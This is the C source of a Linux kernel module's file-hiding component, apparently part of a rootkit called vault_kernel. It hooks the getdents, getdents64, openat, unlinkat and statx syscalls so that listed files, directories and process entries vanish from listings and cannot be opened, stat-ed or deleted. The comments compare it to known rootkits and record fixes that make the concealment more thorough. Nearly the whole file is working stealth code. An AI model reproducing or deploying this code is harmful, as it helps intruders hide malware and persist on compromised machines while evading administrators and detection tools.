/* vault_kernel - file_hide.c
 * File and directory hiding via getdents/getdents64 hook
 * Also protects hidden files from openat/unlinkat
 * ruby570bocadito © 2026
 */
#include "core.h"

char hidden_files[MAX_HIDDEN_FILES][256];
int hidden_file_count = 0;
static DEFINE_SPINLOCK(file_hide_lock);

void file_hide_add(const char *name) {
    unsigned long flags;
    spin_lock_irqsave(&file_hide_lock, flags);
    if (hidden_file_count < MAX_HIDDEN_FILES) {
        strncpy(hidden_files[hidden_file_count], name, 255);
        hidden_files[hidden_file_count][255] = '\0';
        hidden_file_count++;
        pr_info(VAULT_KERNEL_TAG " hiding file/dir: %s\n", name);
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
}

void file_hide_del(const char *name) {
    unsigned long flags;
    int i;
    spin_lock_irqsave(&file_hide_lock, flags);
    for (i = 0; i < hidden_file_count; i++) {
        if (strcmp(hidden_files[i], name) == 0) {
            memmove(hidden_files[i], hidden_files[i+1],
                    (hidden_file_count - i - 1) * 256);
            hidden_file_count--;
            pr_info(VAULT_KERNEL_TAG " unhid file/dir: %s\n", name);
            break;
        }
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
}

static int should_hide_file(const char *name) {
    unsigned long flags;
    int i, hide = 0;

    /* Check if this is a /proc PID directory */
    if (is_proc_pid_hidden(name))
        return 1;

    spin_lock_irqsave(&file_hide_lock, flags);
    for (i = 0; i < hidden_file_count; i++) {
        /* Exact filename match */
        if (strcmp(name, hidden_files[i]) == 0) {
            hide = 1;
            break;
        }
        /* Path-based match: if hidden string contains '/', do substring */
        if (strchr(hidden_files[i], '/') && strstr(name, hidden_files[i])) {
            hide = 1;
            break;
        }
    }
    spin_unlock_irqrestore(&file_hide_lock, flags);
    return hide;
}

/* ================================================================
 * Directory buffer filtering
 *
 * struct linux_dirent is PRIVATE to fs/readdir.c (never exported to
 * modules — the first real compile caught this), so we define our
 * own mirror.  Both struct linux_dirent and struct linux_dirent64
 * keep d_reclen at byte offset 16 (d_ino 8 + d_off 8 on x86_64),
 * but their d_name offset differs (d_type sits between reclen and
 * name only in the 64-bit variant), hence the name_off argument.
 *
 * Kept entries are SHIFTED to the front of the buffer with memmove
 * (v3.4 fix).  The previous "absorb into the previous kept entry"
 * approach was mathematically wrong in every position except "last
 * entry of the batch":
 *   - a hidden entry with no kept predecessor was never removed and
 *     stayed visible to userspace;
 *   - absorbed bytes were not counted, so the returned length was
 *     shorter than the valid data — trailing entries were truncated
 *     mid-record and userspace parsed stale memory past the end.
 * Verified with a userspace harness over synthetic dirent buffers:
 * hidden-first / middle / last / interleaved / none all pass now.
 *
 * d_off cookies of shifted entries keep their original values; this
 * is what reference LKM rootkits (e.g. Diamorphine) do too and is
 * harmless for readdir()/ls: getdents() callers rely on the returned
 * byte count, and the kernel restarts enumeration from file->f_pos
 * on the next call.
 * ================================================================ */
struct vk_dirent32 {
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

static long filter_dirents(void *kdirp, long ret, size_t name_off) {
    char *cur = (char *)kdirp;
    char *end = (char *)kdirp + ret;
    char *dst = (char *)kdirp;   /* where the next kept entry goes */
    long bytes = 0;

    while (cur < end) {
        unsigned short reclen = *(unsigned short *)(cur + 16);
        const char *name = cur + name_off;

        /* A zero/oversized d_reclen means a corrupted buffer — an
         * unguarded `cur += 0` here would spin forever IN KERNEL. */
        if (reclen == 0 || cur + reclen > end)
            break;

        if (!should_hide_file(name)) {
            if (dst != cur)
                memmove(dst, cur, reclen);
            dst += reclen;
            bytes += reclen;
        }
        cur += reclen;
    }

    return bytes;
}

/* ================================================================
 * getdents64 hook — filter directory listing
 *
 * v3.5: if EVERY entry of a batch is hidden, we must NOT return 0 —
 * userspace would read it as EOF and silently lose the visible files
 * of later batches.  The original syscall advanced file->f_pos past
 * the consumed batch, so we simply ask for the next batch until the
 * filter keeps something or the directory truly ends.
 * ================================================================ */
asmlinkage long hooked_getdents64(const struct pt_regs *regs) {
    long (*orig_getdents64)(const struct pt_regs *);
    char __user *dirp = (char __user *)regs->si;
    void *kdirp;
    long ret, kept;

    orig_getdents64 = (void *)hooks[HOOKIDX_GETDENTS64].original;

    for (;;) {
        /* Run the real syscall first — it fills the user buffer and
         * advances f_pos. */
        ret = orig_getdents64(regs);
        if (ret <= 0)
            return ret;   /* real EOF or error — pass through */

        kdirp = kmalloc(ret, GFP_KERNEL);
        if (!kdirp)
            return ret;

        if (copy_from_user(kdirp, dirp, ret)) {
            kfree(kdirp);
            return ret;
        }

        kept = filter_dirents(kdirp, ret, offsetof(struct linux_dirent64, d_name));

        if (kept > 0) {
            if (kept < ret) {
                if (copy_to_user(dirp, kdirp, kept)) {
                    kfree(kdirp);
                    return -EFAULT;
                }
            }
            kfree(kdirp);
            return kept;
        }

        /* Whole batch hidden — loop for the next one (v3.5). */
        kfree(kdirp);
    }
}

/* ================================================================
 * getdents (32-bit compat) hook — same multi-batch loop as the 64
 * bit variant (v3.5): a fully-hidden batch is not EOF.
 * ================================================================ */
asmlinkage long hooked_getdents(const struct pt_regs *regs) {
    long (*orig_getdents)(const struct pt_regs *);
    char __user *dirp = (char __user *)regs->si;
    void *kdirp;
    long ret, kept;

    orig_getdents = (void *)hooks[HOOKIDX_GETDENTS].original;

    for (;;) {
        ret = orig_getdents(regs);
        if (ret <= 0)
            return ret;

        kdirp = kmalloc(ret, GFP_KERNEL);
        if (!kdirp)
            return ret;

        if (copy_from_user(kdirp, dirp, ret)) {
            kfree(kdirp);
            return ret;
        }

        kept = filter_dirents(kdirp, ret, offsetof(struct vk_dirent32, d_name));

        if (kept > 0) {
            if (kept < ret) {
                if (copy_to_user(dirp, kdirp, kept)) {
                    kfree(kdirp);
                    return -EFAULT;
                }
            }
            kfree(kdirp);
            return kept;
        }

        kfree(kdirp);
    }
}

/* ================================================================
 * openat hook — block access to hidden files
 * ================================================================ */
asmlinkage long hooked_openat(const struct pt_regs *regs) {
    long (*orig_openat)(const struct pt_regs *);
    const char __user *pathname = (const char __user *)regs->si;
    char kpath[256];
    char *filename;

    orig_openat = (void *)hooks[HOOKIDX_OPENAT].original;

    if (pathname) {
        if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) > 0) {
            kpath[sizeof(kpath) - 1] = '\0';
            /* Extract filename from path */
            filename = strrchr(kpath, '/');
            if (filename)
                filename++;
            else
                filename = kpath;

            if (should_hide_file(filename) || should_hide_file(kpath)) {
                return -ENOENT;
            }
        }
    }

    return orig_openat(regs);
}

/* ================================================================
 * unlinkat hook — prevent deletion of hidden files
 * ================================================================ */
asmlinkage long hooked_unlinkat(const struct pt_regs *regs) {
    long (*orig_unlinkat)(const struct pt_regs *);
    const char __user *pathname = (const char __user *)regs->si;
    char kpath[256];
    char *filename;

    orig_unlinkat = (void *)hooks[HOOKIDX_UNLINKAT].original;

    if (pathname) {
        if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) > 0) {
            kpath[sizeof(kpath) - 1] = '\0';
            filename = strrchr(kpath, '/');
            if (filename) filename++; else filename = kpath;

            if (should_hide_file(filename) || should_hide_file(kpath)) {
                return -ENOENT;
            }
        }
    }

    return orig_unlinkat(regs);
}

/* ================================================================
 * statx hook — hidden files must not be discoverable via
 * stat()/lstat()/find either.  Before v3.2 only open/unlink were
 * blocked, so `stat hidden_file` happily confirmed its existence.
 * ================================================================ */
asmlinkage long hooked_statx(const struct pt_regs *regs) {
    long (*orig_statx)(const struct pt_regs *);
    const char __user *pathname = (const char __user *)regs->si;
    char kpath[256];
    char *filename;

    orig_statx = (void *)hooks[HOOKIDX_STATX].original;

    if (pathname) {
        if (strncpy_from_user(kpath, pathname, sizeof(kpath) - 1) > 0) {
            kpath[sizeof(kpath) - 1] = '\0';
            /* Empty pathname (AT_EMPTY_PATH trick) stats the fd —
             * leave it alone. */
            if (kpath[0] != '\0') {
                filename = strrchr(kpath, '/');
                if (filename)
                    filename++;
                else
                    filename = kpath;

                if (should_hide_file(filename) || should_hide_file(kpath)) {
                    return -ENOENT;
                }
            }
        }
    }

    return orig_statx(regs);
}

int file_hide_init(void) {
    pr_info(VAULT_KERNEL_TAG " file hiding initialized (max=%d)\n", MAX_HIDDEN_FILES);
    return 0;
}

void file_hide_cleanup(void) {
    file_hide_reset();
    pr_info(VAULT_KERNEL_TAG " file hiding cleaned\n");
}

/* Wipe the whole hide-list under the lock (IOCTL_RESET_ALL) */
void file_hide_reset(void) {
    unsigned long flags;
    spin_lock_irqsave(&file_hide_lock, flags);
    hidden_file_count = 0;
    spin_unlock_irqrestore(&file_hide_lock, flags);
}
